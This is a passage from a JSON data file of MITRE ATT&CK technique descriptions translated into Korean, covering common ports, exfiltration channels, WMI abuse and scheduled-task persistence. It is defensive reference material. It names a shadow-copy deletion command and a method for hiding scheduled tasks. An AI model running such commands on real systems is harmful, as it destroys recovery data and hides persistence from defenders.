      "title": "Change Default File Association",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않습니다. 적절한 경우 [비표준 포트](https://attack.mitre.org/techniques/T1571)를 사용하시기 바랍니다.**\n\n공격자는 방화벽이나 네트워크 탐지 시스템을 우회하고 정상적인 네트워크 활동과 섞여 더 자세한 검사를 피하기 위해 일반적으로 사용되는 포트를 통해 통신할 수 있습니다. 그들은 다음과 같은 일반적으로 열려 있는 포트를 사용할 수 있습니다.\n\n* TCP:80 (HTTP)\n* TCP:443 (HTTPS)\n* TCP:25 (SMTP)\n* TCP/UDP:53 (DNS)\n\n그들은 포트에 연결된 프로토콜을 사용하거나 완전히 다른 프로토콜을 사용할 수 있습니다.\n\n클러스터 내에서 발생하는 연결(예: 프록시 또는 피봇 노드와 다른 노드 간의 연결)에서 일반적인 포트의 예는 다음과 같습니다.\n\n* TCP/UDP:135 (RPC)\n* TCP/UDP:22 (SSH)\n* TCP/UDP:3389 (RDP)",
      "external_id": "T1043",
      "modified": "2022-07-22T18:51:42.238Z",
      "title": "Commonly Used Port",
      "translated": true
    },
    {
      "description": "프로세스는 그 기능의 일환으로 특정 바이너리를 자동으로 실행하거나 다른 작업을 수행할 수 있습니다. 타겟 바이너리가 포함된 파일 시스템 디렉터리의 권한이나 바이너리 자체의 권한이 부적절하게 설정된 경우, 타겟 바이너리는 사용자 수준의 권한을 통해 다른 바이너리로 덮어쓰여지며 원래 프로세스에 의해 실행될 수 있습니다. 만약 원래 프로세스와 스레드가 더 높은 권한 수준에서 실행 중이라면, 교체된 바이너리도 더 높은 권한 수준에서 실행되며, 이에는 SYSTEM 권한이 포함될 수 있습니다.\n\n적대자는 이 기법을 사용하여 합법적인 바이너리를 악성 바이너리로 교체함으로써 더 높은 권한 수준에서 코드를 실행할 수 있습니다. 실행 프로세스가 특정 시간이나 특정 이벤트(예: 시스템 부팅) 동안 실행되도록 설정되어 있다면, 이 기술은 지속성을 위해서도 활용될 수 있습니다.\n\n### 서비스\n\nWindows 서비스 바이너리의 조작은 이 기술의 한 변형입니다. 적대자는 합법적인 서비스 실행 파일을 자신들의 실행 파일로 교체하여 지속성을 확보하고 서비스가 실행되도록 설정된 계정 컨텍스트(로컬/도메인 계정, SYSTEM, LocalService 또는 NetworkService)에 대한 권한 상승을 얻을 수 있습니다. 서비스가 시작되면, 적절한 접근 권한이 있는 사용자가 직접 시작하거나 부팅 시 서비스가 시작되는 경우와 같이 다른 방법을 통해 서비스가 시작되면, 교체된 실행 파일이 원래 서비스 실행 파일 대신 실행됩니다.\n\n### 실행 파일 설치 프로그램\n\n이 기술의 또 다른 변형은 실행 가능하고 자동 압축 해제 기능이 있는 설치 프로그램의 일반적인 취약점을 이용하는 것입니다. 설치 과정 중, 설치 프로그램은 종종 <code>%TEMP%</code> 디렉터리 내의 하위 디렉터리를 사용하여 DLL, EXE 또는 기타 페이로드와 같은 바이너리를 압축 해제합니다. 설치 프로그램이 하위 디렉터리와 파일을 생성할 때, 일반적으로 쓰기 접근을 제한할 적절한 권한을 설정하지 않기 때문에 하위 디렉터리에 배치된 신뢰할 수 없는 코드의 실행이나 설치 과정에서 사용되는 바이너리의 덮어쓰기가 가능해집니다. 이 행동은 [DLL 검색 순서 하이재킹](https://attack.mitre.org/techniques/T1038)과 관련이 있으며 이를 이용할 수 있습니다. 일부 설치 프로그램은 또한 권한 상승이 발생할 수 있는 상승된 권한을 요구하기도 합니다. 이 행동은 [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1088)와 관련이 있습니다. 기존의 일반적인 설치 프로그램에서 이 취약점의 여러 예가 소프트웨어 공급업체에 보고되었습니다. (인용: Mozilla Firefox 설치 프로그램 DLL 하이재킹) (인용: Seclists Kanthak 7zip 설치 프로그램)",
      "external_id": "T1044",
      "modified": "2020-03-19T15:11:39.627Z",
      "title": "File System Permissions Weakness",
      "translated": true
    },
    {
      "description": "소프트웨어 패킹은 실행 파일을 압축하거나 암호화하는 방법입니다. 실행 파일을 패킹하면 파일 서명이 변경되어 서명 기반 탐지를 피하려고 합니다. 대부분의 압축 해제 기술은 실행 코드의 압축을 메모리에서 수행합니다.\n\n소프트웨어 패킹을 수행하는 데 사용되는 유틸리티는 패커(packer)라고 합니다. 예시 패커로는 MPRESS와 UPX가 있습니다. 잘 알려진 패커의 포괄적인 목록은 (출처: 위키백과 실행 파일 압축)에서 확인할 수 있지만, 적들은 방어를 피하기 위해 잘 알려진 패커와 동일한 아티팩트를 남기지 않는 자체 패킹 기법을 만들 수도 있습니다.\n\n적들은 코드 보호의 일환으로 소프트웨어 패킹으로 가상 머신 소프트웨어 보호를 사용할 수 있습니다. 가상 머신 소프트웨어 보호는 실행 파일의 원래 코드를 특별한 형식으로 변환하여 오직 특정 가상 머신만 실행할 수 있도록 합니다. 그런 다음 이 코드를 실행하기 위해 가상 머신이 호출됩니다. (출처: ESET FinFisher 2018년 1월)",
      "external_id": "T1045",
      "modified": "2020-02-05T14:18:21.533Z",
      "title": "Software Packing",
      "translated": true
    },
    {
      "description": "적대자들은 원격 호스트 및 로컬 네트워크 인프라 장치에서 실행 중인 서비스 목록을 획득하려고 할 수 있으며, 이는 원격 소프트웨어 취약점에 노출될 수도 있습니다. 이러한 정보를 획득하기 위한 일반적인 방법에는 포트 및/또는 취약성 스캔을 수행하는 도구를 시스템에 가져오는 것이 포함됩니다. (출처: CISA AR21-126A FIVEHANDS 2021년 5월)\n\n클라우드 환경 내에서 적대자들은 다른 클라우드 호스트에서 실행 중인 서비스를 발견하려고 할 수 있습니다. 또한, 클라우드 환경이 온프레미스 환경과 연결되어 있는 경우, 적대자는 비클라우드 시스템에서 실행 중인 서비스도 식별할 수 있습니다.\n\nmacOS 환경 내에서 적대자들은 로컬 네트워크 내의 다른 macOS 호스트에서 실행 중인 서비스를 발견하기 위해 기본 제공되는 Bonjour 애플리케이션을 사용할 수 있습니다. Bonjour의 mDNSResponder 데몬은 등록된 서비스의 호스트를 자동으로 등록하고 네트워크에서 광고합니다. 예를 들어, 적대자는 mDNS 쿼리(예: <code>dns-sd -B _ssh._tcp .</code>)를 사용하여 ssh 서비스를 방송하는 다른 시스템을 찾을 수 있습니다. (출처: apple doco bonjour 설명)(출처: macOS APT 활동 Bradley)",
      "external_id": "T1046",
      "modified": "2023-08-11T21:10:09.547Z",
      "title": "Network Service Discovery",
      "translated": true
    },
    {
      "description": "침략자는 악성 명령 및 페이로드를 실행하기 위해 Windows 관리 도구(WMI)를 악용할 수 있습니다. WMI는 프로그래머를 위해 설계되었으며 Windows 시스템의 관리 데이터와 작업을 위한 인프라입니다. WMI는 Windows 시스템 구성 요소에 접근하기 위한 일관된 환경을 제공하는 관리 기능입니다.\n\nWMI 서비스는 로컬 및 원격 접근을 모두 가능하게 하지만, 후자는 [원격 서비스](https://attack.mitre.org/techniques/T1021)인 [분산 구성 요소 개체 모델](https://attack.mitre.org/techniques/T1021/003)과 [Windows 원격 관리](https://attack.mitre.org/techniques/T1021/006)에 의하여 지원됩니다. 원격 WMI는 DCOM을 통해 포트 135를 사용하여 작동하는 반면, WinRM을 통한 WMI는 HTTP를 사용할 때 포트 5985 및 HTTPS를 사용할 때 포트 5986에서 작동합니다.\n\n침략자는 WMI를 사용하여 로컬 및 원격 시스템과 상호작용하고, 이를 통해 [탐색](https://attack.mitre.org/tactics/TA0007)을 위한 정보 수집 및 명령과 페이로드의 [실행](https://attack.mitre.org/tactics/TA0002)과 같은 다양한 행동을 실행할 수 있습니다. 예를 들어, `wmic.exe`는 침략자가 `wmic.exe Shadowcopy Delete` 명령어를 사용하여 그림자 복사를 삭제하는 데 악용될 수 있습니다 (즉, [시스템 복구 방해](https://attack.mitre.org/techniques/T1490)).\n\n**참고:** `wmic.exe`는 2024년 1월부터 사용 중단(deprecated)되며, Windows 11 이상에서는 WMIC 기능이 “기본적으로 비활성화”됩니다. WMIC는 향후 Windows 릴리스에서 제거되고 [PowerShell](https://attack.mitre.org/techniques/T1059/001)이 기본 WMI 인터페이스로 대체됩니다. PowerShell 및 `wbemtool.exe`와 같은 도구 외에도 C++, .NET, VBScript 등을 통해 프로그램적으로 WMI와 상호작용하는 데 COM API를 사용할 수도 있습니다.",
      "external_id": "T1047",
      "modified": "2024-10-15T15:20:57.328Z",
      "title": "Windows Management Instrumentation",
      "translated": true
    },
    {
      "description": "적대자는 기존의 명령 및 제어 채널과는 다른 프로토콜을 사용하여 데이터를 유출할 수 있습니다. 이 데이터는 또한 주요 명령 및 제어 서버가 아닌 다른 네트워크 위치로 전송될 수 있습니다.\n\n대체 프로토콜에는 FTP, SMTP, HTTP/S, DNS, SMB 또는 주요 명령 및 제어 채널로 사용되지 않는 기타 네트워크 프로토콜이 포함됩니다. 적대자는 이러한 대체 채널을 암호화하거나 난독화할 수도 있습니다.\n\n[대체 프로토콜을 통한 데이터 유출](https://attack.mitre.org/techniques/T1048)은 [Net](https://attack.mitre.org/software/S0039)/SMB 또는 FTP와 같은 다양한 일반 운영 체제 유틸리티를 사용하여 수행할 수 있습니다. (출처: Palo Alto OilRig 2016년 10월) macOS 및 Linux에서는 <code>curl</code>을 사용하여 HTTP/S 또는 FTP/S와 같은 프로토콜을 호출하여 시스템에서 데이터를 유출할 수 있습니다. (출처: 20 macOS 일반 도구 및 기법)\n\n많은 IaaS 및 SaaS 플랫폼(예: Microsoft Exchange, Microsoft SharePoint, GitHub, AWS S3)은 웹 콘솔 또는 [Cloud API](https://attack.mitre.org/techniques/T1059/009)를 통해 파일, 이메일, 소스 코드 및 기타 민감한 정보를 직접 다운로드 하는 것을 지원합니다.",
      "external_id": "T1048",
      "modified": "2024-10-15T15:57:26.415Z",
      "title": "Exfiltration Over Alternative Protocol",
      "translated": true
    },
    {
      "description": "적대 세력은 기존의 명령 및 제어 채널이 아닌 대칭 암호화 네트워크 프로토콜을 통해 데이터를 유출함으로써 데이터를 탈취할 수 있습니다. 탈취된 데이터는 주요 명령 및 제어 서버 외의 대체 네트워크 위치로 전송될 수도 있습니다.\n\n대칭 암호화 알고리즘은 채널 양쪽에서 공유되거나 동일한 키/비밀을 사용하는 방식입니다. 이는 데이터를 암호화하고 복호화하는 데 사용되는 값을 교환하거나 사전 합의 및 보유가 필요합니다.\n\n비대칭 암호화를 사용하는 네트워크 프로토콜은 키가 교환된 이후 대칭 암호화를 사용하는 경우가 많지만, 적대 세력은 수동으로 키를 공유하고 프로토콜에 내장된 메커니즘 대신 대칭 암호화 알고리즘(예: RC4, AES)을 구현할 수 있습니다. 이로 인해 여러 겹의 암호화가 발생할 수 있으며(HTTPS와 같은 원래 암호화된 프로토콜) 일반적으로 암호화되지 않는 프로토콜에서도 암호화가 발생할 수 있습니다(예: HTTP 또는 FTP).",
      "external_id": "T1048.001",
      "modified": "2020-03-28T00:43:24.228Z",
      "title": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
      "translated": true
    },
    {
      "description": "적대자는 기존의 명령 및 제어 채널 외의 비대칭 암호화 네트워크 프로토콜을 통해 데이터를 유출하여 절취할 수 있습니다. 데이터는 또한 주요 명령 및 제어 서버가 아닌 다른 네트워크 위치로 전송될 수 있습니다.\n\n비대칭 암호화 알고리즘은 채널의 양쪽 끝에서 서로 다른 키를 사용하는 알고리즘입니다. 공개 키 암호화(public-key cryptography)라고도 알려진 이 방식은 서로 다른 키 쌍을 필요로 하며, 이 키들은 해당하는 키를 사용하여 데이터를 암호화 및 복호화하는 데 사용됩니다. 통신 채널의 각 끝에서는 그 엔티티의 소유만 있는 개인 키와 다른 엔티티의 공개 키가 필요합니다. 각 엔티티의 공개 키는 암호화된 통신이 시작되기 전에 교환됩니다.\n\n비대칭 암호화를 사용하는 네트워크 프로토콜(예: HTTPS/TLS/SSL)은 종종 키가 교환된 후 대칭 암호화를 사용합니다. 적대자는 이러한 프로토콜에 내장된 암호화 메커니즘을 선택하여 사용할 수 있습니다.",
      "external_id": "T1048.002",
      "modified": "2021-10-15T22:44:11.953Z",
      "title": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
      "translated": true
    },
    {
      "description": "적대자는 기존의 명령 및 제어 채널 이외의 암호화되지 않은 네트워크 프로토콜을 통해 데이터를 빼내거나 탈취할 수 있습니다. 이 데이터는 주 명령 및 제어 서버와는 다른 네트워크 위치로 전송될 수도 있습니다. (인용: copy_cmd_cisco)\n\n적대자는 데이터 암호화 없이 기본적으로 암호화되지 않은 네트워크 프로토콜(예: HTTP, FTP 또는 DNS) 내에서 이 데이터를 난독화하는 방식을 선택할 수 있습니다. 이는 base64와 같은 사용자 정의 또는 공개적으로 이용 가능한 인코딩/압축 알고리즘을 포함할 수 있으며, 프로토콜 헤더 및 필드 내에 데이터를 삽입하는 것을 포함합니다.",
      "external_id": "T1048.003",
      "modified": "2023-04-12T23:39:25.476Z",
      "title": "Exfiltration Over Unencrypted Non-C2 Protocol",
      "translated": true
    },
    {
      "description": "공격자는 현재 접근 중인 손상된 시스템 또는 원격 시스템에서 네트워크 연결 목록을 얻기 위해 네트워크를 통해 정보를 쿼리하려고 시도할 수 있습니다.\n\n클라우드 기반 환경의 일부인 시스템에 접근한 공격자는 가상 사설 클라우드(VPC) 또는 가상 네트워크를 매핑하여 어떤 시스템과 서비스가 연결되어 있는지를 파악할 수 있습니다. 수행되는 작업은 운영 체제에 따라 동일한 종류의 탐색 기술일 가능성이 높지만, 결과적으로 얻는 정보는 공격자의 목표와 관련된 네트워크 클라우드 환경에 대한 세부 정보를 포함할 수 있습니다. 클라우드 제공업체마다 가상 네트워크가 작동하는 방식이 다를 수 있습니다. (출처: Amazon AWS VPC 가이드)(출처: Microsoft Azure 가상 네트워크 개요)(출처: Google VPC 개요) 유사하게, 네트워크 장치에 접근한 공격자도 연결된 시스템 및 서비스에 대한 정보를 수집하기 위해 유사한 탐색 활동을 수행할 수 있습니다.\n\n이 정보를 수집하기 위해 사용하는 유틸리티 및 명령어에는 [netstat](https://attack.mitre.org/software/S0104), \"net use\" 및 [Net](https://attack.mitre.org/software/S0039)의 \"net session\"이 포함됩니다. Mac 및 Linux에서는 [netstat](https://attack.mitre.org/software/S0104) 및 <code>lsof</code>를 사용하여 현재 연결을 나열할 수 있습니다. <code>who -a</code> 및 <code>w</code>는 현재 로그인한 사용자를 보여주는 데 사용될 수 있으며, 이는 \"net session\"과 유사합니다. 또한, 네트워크 장치에 고유한 기본 기능 및 [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)를 사용하여 (예: <code>show ip sockets</code>, <code>show tcp brief</code>) 정보를 수집할 수 있습니다. (출처: US-CERT-TA18-106A)",
      "external_id": "T1049",
      "modified": "2022-09-06T22:35:34.231Z",
      "title": "System Network Connections Discovery",
      "translated": true
    },
    {
      "description": "운영 체제가 부팅될 때, 시스템의 백그라운드 기능을 수행하는 프로그램이나 애플리케이션인 서비스가 시작될 수 있습니다. 서비스의 구성 정보, 즉 서비스 실행 파일의 경로는 Windows 레지스트리에 저장됩니다.\n\n공격자는 서비스를 설치하여 시스템 시작 시 실행되도록 구성할 수 있으며, 이를 위해 서비스를 조작하는 유틸리티를 사용하거나 레지스트리를 직접 수정할 수 있습니다. 서비스 이름은 관련 운영 체제나 악의적이지 않은 소프트웨어의 이름을 사용하여 위장할 수 있습니다[Masquerading](https://attack.mitre.org/techniques/T1036). 서비스는 관리자 권한으로 생성될 수 있지만 SYSTEM 권한으로 실행되므로, 공격자는 서비스를 이용해 관리자 권한에서 SYSTEM 권한으로 상승할 수도 있습니다. 또한 공격자는 [서비스 실행](https://attack.mitre.org/techniques/T1035)을 통해 서비스를 직접 시작할 수도 있습니다.",
      "external_id": "T1050",
      "modified": "2020-03-17T16:21:36.413Z",
      "title": "New Service",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않으며, 폐기되었습니다.**\n\n적대적인 사용자는 웹사이트의 웹 루트 또는 웹 콘텐츠 디렉토리가 포함된 공개 네트워크 파일 공유를 통해 내부에서 접근 가능한 웹사이트에 악성 콘텐츠를 추가할 수 있습니다 (인용: Microsoft Web Root OCT 2016) (인용: Apache Server 2018). 이후 웹 브라우저를 통해 해당 콘텐츠를 탐색하면 서버가 악성 콘텐츠를 실행하게 됩니다. 이 악성 콘텐츠는 일반적으로 웹 서버 프로세스의 컨텍스트 및 권한 하에서 실행되며, 웹 서버의 설정에 따라 로컬 시스템 또는 관리 권한을 가지게 되는 경우가 많습니다.\n\n이러한 공유 접근 및 원격 실행 메커니즘은 웹 서버를 실행 중인 시스템으로의 수평 이동에도 사용할 수 있습니다. 예를 들어, 공개 네트워크 공유가 허용된 PHP를 실행 중인 웹 서버는 적대적인 사용자가 원격 접근 도구와 PHP 스크립트를 업로드하여 특정 페이지가 방문될 때 웹 서버를 실행 중인 시스템에서 RAT를 실행할 수 있도록 할 수 있습니다 (인용: Webroot PHP 2011).",
      "external_id": "T1051",
      "modified": "2024-09-04T21:41:21.642Z",
      "title": "Shared Webroot",
      "translated": true
    },
    {
      "description": "적대적 행위자들은 이동식 드라이브와 같은 물리적 매체를 통해 데이터를 유출하려 할 수 있습니다. 공기 간섭이 없는 네트워크가 침해당하는 등의 특정 상황에서는 사용자가 도입한 물리적 매체나 장치를 통해 유출이 발생할 수 있습니다. 이러한 매체에는 외장 하드 드라이브, USB 드라이브, 휴대전화, MP3 플레이어 또는 기타 이동식 저장 및 처리 장치가 포함될 수 있습니다. 물리적 매체나 장치는 최종 유출 지점으로 사용되거나 서로 연결되지 않은 시스템 간에 이동하는 데 사용될 수 있습니다.",
      "external_id": "T1052",
      "modified": "2021-10-15T22:48:29.702Z",
      "title": "Exfiltration Over Physical Medium",
      "translated": true
    },
    {
      "description": "적대자들은 USB 연결된 물리적 장치를 통해 데이터를 유출하려고 시도할 수 있습니다. 공중 분리 네트워크 침해와 같은 특정 상황에서는 사용자가 도입한 USB 장치를 통해 유출이 발생할 수 있습니다. USB 장치는 최종 유출 지점으로 사용되거나 서로 연결되지 않은 시스템 간의 이동 수단으로 사용될 수 있습니다.",
      "external_id": "T1052.001",
      "modified": "2021-10-15T22:48:29.490Z",
      "title": "Exfiltration over USB",
      "translated": true
    },
    {
      "description": "적대 세력은 초기 또는 반복적인 악성 코드 실행을 용이하게 하기 위해 작업 예약 기능을 악용할 수 있습니다. 모든 주요 운영 체제에는 특정 날짜와 시간에 프로그램이나 스크립트를 실행하도록 예약할 수 있는 유틸리티가 있습니다. 또한 적절한 인증이 충족되면 원격 시스템에서 작업을 예약할 수도 있습니다(예: Windows 환경에서의 RPC 및 파일 및 프린터 공유). 원격 시스템에서 작업을 예약하려면 일반적으로 해당 원격 시스템의 관리자 또는 다른 권한이 있는 그룹의 일원이여야 할 수 있습니다.(인용: TechNet 작업 스케줄러 보안)\n\n적대 세력은 작업 예약을 사용하여 시스템 시작 시 또는 일정한 간격으로 프로그램을 실행하여 지속성을 유지할 수 있습니다. 이러한 메커니즘은 특정 계정(예: 권한이 상승한 계정)의 컨텍스트에서 프로세스를 실행하기 위해 악용될 수 있습니다. [시스템 바이너리 프록시 실행](https://attack.mitre.org/techniques/T1218)과 유사하게, 적대 세력은 신뢰할 수 있는 시스템 프로세스 아래에서 일회성 실행을 잠재적으로 숨기기 위해 작업 예약을 악용하기도 했습니다.(인용: ProofPoint Serpent)",
      "external_id": "T1053",
      "modified": "2024-10-15T15:14:03.453Z",
      "title": "Scheduled Task/Job",
      "translated": true
    },
    {
      "description": "적대자는 [at](https://attack.mitre.org/software/S0110) 유틸리티를 악용하여 악성 코드를 초기 실행, 정기 실행 또는 미래 실행을 위해 작업 예약을 수행할 수 있습니다. 리눅스 운영 체제 내의 [at](https://attack.mitre.org/software/S0110) 명령은 관리자에게 작업을 예약할 수 있는 기능을 제공합니다. (출처: Kifarunix - 리눅스의 작업 스케줄링)\n\n적대자는 리눅스 환경에서 [at](https://attack.mitre.org/software/S0110)를 사용하여 시스템 시작 시 또는 예약된 시간에 프로그램을 실행하여 지속성을 유지할 수 있습니다. [at](https://attack.mitre.org/software/S0110)는 또한 원격 실행을 수행하여 횡적 이동의 일환으로 사용되거나 특정 계정의 컨텍스트에서 프로세스를 실행하는 데 악용될 수 있습니다.\n\n또한 적대자는 [at](https://attack.mitre.org/software/S0110)를 악용하여 제한된 환경에서 탈출하기 위해 작업을 사용하여 대화형 시스템 셸을 생성하거나 시스템 명령을 실행할 수 있습니다. 마찬가지로, [at](https://attack.mitre.org/software/S0110)는 <code>sudo</code>를 통해 바이너리가 슈퍼유저로 실행될 수 있는 경우 [권한 상승](https://attack.mitre.org/tactics/TA0004)에도 사용될 수 있습니다. (출처: GTFObins at)",
      "external_id": "T1053.001",
      "modified": "2022-04-16T20:45:01.814Z",
      "title": "At (Linux)",
      "translated": true
    },
    {
      "description": "적대자는 [at](https://attack.mitre.org/software/S0110) 유틸리티를 악용하여 초기 또는 반복적으로 악성 코드를 실행하도록 작업 일정을 수행할 수 있습니다. [at](https://attack.mitre.org/software/S0110) 유틸리티는 Windows, Linux 및 macOS에서 특정 시간과 날짜에 작업을 예약하기 위해 실행 파일 형태로 존재합니다. Windows 환경에서는 [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)의 [schtasks](https://attack.mitre.org/software/S0111)가 권장되지만, [at](https://attack.mitre.org/software/S0110)을 사용하려면 작업 예약 서비스가 실행 중이어야 하며, 사용자가 로컬 관리자 그룹의 회원으로 로그인해야 합니다. 적대자는 `at` 명령을 명시적으로 실행하는 것 외에도 [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI 클래스를 직접 활용하여 [at](https://attack.mitre.org/software/S0110)로 작업을 예약할 수 있습니다. (출처: Cybereason의 Malicious Life)\n\nLinux 및 macOS에서는 [at](https://attack.mitre.org/software/S0110)를 슈퍼유저뿐만 아니라 <code>at.allow</code> 파일에 추가된 모든 사용자가 호출할 수 있습니다. <code>at.allow</code> 파일이 존재하지 않는 경우, <code>at.deny</code> 파일이 확인됩니다. <code>at.deny</code>에 나열되지 않은 모든 사용자 이름은 [at](https://attack.mitre.org/software/S0110)를 호출할 수 있습니다. <code>at.deny</code>가 존재하지만 비어 있으면 [at](https://attack.mitre.org/software/S0110)의 전역 사용이 허용됩니다. 두 파일이 모두 존재하지 않는 경우(이는 종종 기본 상태입니다) 슈퍼유저만 [at](https://attack.mitre.org/software/S0110)를 사용할 수 있습니다. (출처: Linux at)\n\n적대자는 [at](https://attack.mitre.org/software/S0110)를 사용하여 시스템 시작 시 또는 예정된 시간에 프로그램을 실행하여 [Persistence](https://attack.mitre.org/tactics/TA0003)를 유지할 수 있습니다. [at](https://attack.mitre.org/software/S0110)는 원격 [Execution](https://attack.mitre.org/tactics/TA0002)을 수행하거나 [Lateral Movement](https://attack.mitre.org/tactics/TA0008)의 일환으로 특정 사용자 계정(예: SYSTEM)의 컨텍스트에서 프로세스를 실행할 때 남용될 수도 있습니다.\n\nLinux 환경에서 적대자는 [at](https://attack.mitre.org/software/S0110)를 악용하여 제한된 환경에서 벗어나 인터랙티브 시스템 셸을 생성하거나 시스템 명령을 실행하기 위한 작업을 사용할 수 있습니다. 마찬가지로, [at](https://attack.mitre.org/software/S0110)는 <code>sudo</code>를 통해 바이너리가 슈퍼유저로 실행될 수 있는 경우 [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)을 위해서도 사용될 수 있습니다. (출처: GTFObins at)",
      "external_id": "T1053.002",
      "modified": "2024-10-12T15:53:12.333Z",
      "title": "At",
      "translated": true
    },
    {
      "description": "적대자는 초기 또는 반복적으로 악성 코드를 실행하기 위해 <code>cron</code> 유틸리티를 악용할 수 있습니다. (<Citation: 20 macOS Common Tools and Techniques>) <code>cron</code> 유틸리티는 유닉스 계열 운영 체제를 위한 시간 기반 작업 스케줄러입니다. <code>crontab</code> 파일은 실행할 cron 항목의 일정과 실행 시간에 대한 정보를 포함하고 있습니다. 모든 <code>crontab</code> 파일은 운영 체제별 파일 경로에 저장됩니다.\n\n적대자는 리눅스 또는 유닉스 환경에서 <code>cron</code>을 사용하여 시스템 시작 시 또는 일정에 따라 프로그램을 실행하여 [지속성(Persistence)](https://attack.mitre.org/tactics/TA0003)를 유지할 수 있습니다.",
      "external_id": "T1053.003",
      "modified": "2024-10-15T18:45:51.945Z",
      "title": "Cron",
      "translated": true
    },
    {
      "description": "이 기술은 부정확한 사용으로 인해 더 이상 권장되지 않습니다. 보고서에서는 악성 코드가 알려진 서비스를 거치지 않고 launchd와 직접적으로 어떻게 상호작용했는지에 대한 기술적 세부정보를 제공하지 않았습니다. 다른 시스템 서비스들이 launchd와 상호작용하는 데 사용되며, launchd 자체만이 사용되는 것은 아닙니다.\n\n적대자는 <code>Launchd</code> 데몬을 남용하여 악성 코드의 초기 또는 반복 실행을 위한 작업 스케줄링을 수행할 수 있습니다. macOS에 고유한 <code>launchd</code> 데몬은 운영 체제 내에서 서비스의 로드 및 유지 관리를 담당합니다. 이 프로세스는 <code>/System/Library/LaunchDaemons</code> 및 <code>/Library/LaunchDaemons</code>에서 발견되는 속성 목록(plist) 파일에서 각 온디맨드 시스템 수준 데몬에 대한 매개변수를 로드합니다(출처: AppleDocs Launch Agent Daemons). 이러한 LaunchDaemons는 실행될 실행 파일을 가리키는 속성 목록 파일을 포함하고 있습니다(출처: Mac 멀웨어 지속성 방법).\n\n적대자는 macOS 환경에서 <code>launchd</code> 데몬을 사용하여 시스템 시작 시 새 실행 파일을 실행하거나 정기적으로 실행하여 지속성을 확보할 수 있습니다. <code>launchd</code>는 또한 특정 계정의 컨텍스트에서 프로세스를 실행하는 데 남용될 수 있습니다. <code>launchd</code>와 같은 데몬은 루트 사용자 계정의 권한으로 실행되며, 어떤 사용자 계정이 로그인되어 있는지에 관계없이 운영됩니다.",
      "external_id": "T1053.004",
      "modified": "2021-10-07T21:38:03.610Z",
      "title": "Launchd",
      "translated": true
    },
    {
      "description": "공격자는 초기 또는 반복적인 악성 코드 실행을 위해 Windows 작업 스케줄러를 악용할 수 있습니다. Windows에서 작업 스케줄러에 접근하는 방법은 여러 가지가 있습니다. [schtasks](https://attack.mitre.org/software/S0111) 유틸리티는 명령줄에서 직접 실행할 수 있으며, 제어판의 관리 도구 섹션을 통해 GUI를 통해 작업 스케줄러를 열 수 있습니다. (출처: Stack Overflow) 경우에 따라 공격자는 Windows 작업 스케줄러용 .NET 래퍼를 사용했으며, 대안으로 공격자는 Windows netapi32 라이브러리와 [Windows 관리 도구](https://attack.mitre.org/techniques/T1047) (WMI)를 사용하여 예약된 작업을 생성하였습니다. 공격자는 또한 WMI 클래스를 활용하는 PowerShell Cmdlet `Invoke-CimMethod`를 사용하여 XML 경로를 통해 예약된 작업을 생성할 수 있습니다. (출처: Red Canary - Atomic Red Team)\n\n공격자는 Windows 작업 스케줄러를 사용하여 시스템 시작 시 또는 예약된 기반으로 프로그램을 실행하여 지속성을 유지할 수 있습니다. Windows 작업 스케줄러는 또한 원격 실행을 수행하거나 특정 계정(예: SYSTEM)의 컨텍스트에서 프로세스를 실행하기 위한 측면으로 악용될 수 있습니다. [시스템 바이너리 프록시 실행](https://attack.mitre.org/techniques/T1218)과 유사하게, 공격자는 서명된/신뢰된 시스템 프로세스 아래에서 일회성 실행을 숨기기 위해 Windows 작업 스케줄러를 악용할 수 있습니다. (출처: ProofPoint Serpent)\n\n공격자는 또한 방어 도구와 작업 열거를 위한 수동 쿼리에서 표시되지 않을 수 있는 \"숨겨진\" 예약된 작업을 생성할 수 있습니다 (즉, [아티팩트 숨기기](https://attack.mitre.org/techniques/T1564)). 특히, 공격자는 연결된 보안 설명자(SD) 레지스트리 값을 삭제하여 `schtasks /query`와 작업 스케줄러에서 작업을 숨길 수 있습니다 (이 값 삭제는 SYSTEM 권한을 사용하여 수행되어야 함). (출처: SigmaHQ)(출처: Tarrask 예약 작업) 공격자는 또한 연결된 레지스트리 키 내의 메타데이터(예: `Index` 값)를 변경하는 등의 대체 방법을 사용하여 작업을 숨길 수 있습니다. (출처: Windows 환경에서 예약 작업 공격 방어)",
      "external_id": "T1053.005",
      "modified": "2024-10-13T16:13:47.770Z",
      "title": "Scheduled Task",
      "translated": true
    },
    {
      "description": "적대자는 시스템d 타이머를 악성 코드의 초기 또는 반복 실행을 위한 작업 예약에 악용할 수 있습니다. 시스템d 타이머는 서비스를 제어하는 <code>.timer</code> 파일 확장자를 가진 유닛 파일입니다. 타이머는 캘린더 이벤트에서 실행되도록 설정하거나 시작 지점에 상대적인 시간 경과 후 실행될 수 있습니다. 이는 Linux 환경에서 [Cron](https://attack.mitre.org/techniques/T1053/003)의 대안으로 사용될 수 있습니다. (출처: archlinux 시스템d 타이머 2020년 8월) 시스템d 타이머는 <code>systemctl</code> 명령 줄 유틸리티를 통해 원격으로 활성화될 수 있으며, 이는 [SSH](https://attack.mitre.org/techniques/T1021/004)를 통해 작동합니다. (출처: 시스템d 원격 제어)\n\n각 <code>.timer</code> 파일에는 동일한 이름의 <code>.service</code> 파일이 있어야 하며, 예를 들어 <code>example.timer</code>와 <code>example.service</code>가 있습니다. <code>.service</code> 파일은 시스템d 시스템 및 서비스 관리자가 관리하는 [시스템d 서비스](https://attack.mitre.org/techniques/T1543/002) 유닛 파일입니다. (출처: 리눅스 매뉴얼: 시스템d 2014년 1월) 권한 있는 타이머는 <code>/etc/systemd/system/</code> 및 <code>/usr/lib/systemd/system</code>에 작성되며, 사용자 수준 타이머는 <code>~/.config/systemd/user/</code>에 작성됩니다.\n\n적대자는 시스템 시작 시 또는 예약된 기준에 따라 악성 코드를 실행하기 위해 시스템d 타이머를 사용할 수 있습니다. (출처: Arch Linux 패키지 시스템d 침해 BleepingComputer 2018년 7월 10일)(출처: gist Arch 패키지 침해 2018년 7월 10일)(출처: acroread 패키지 손상 Arch 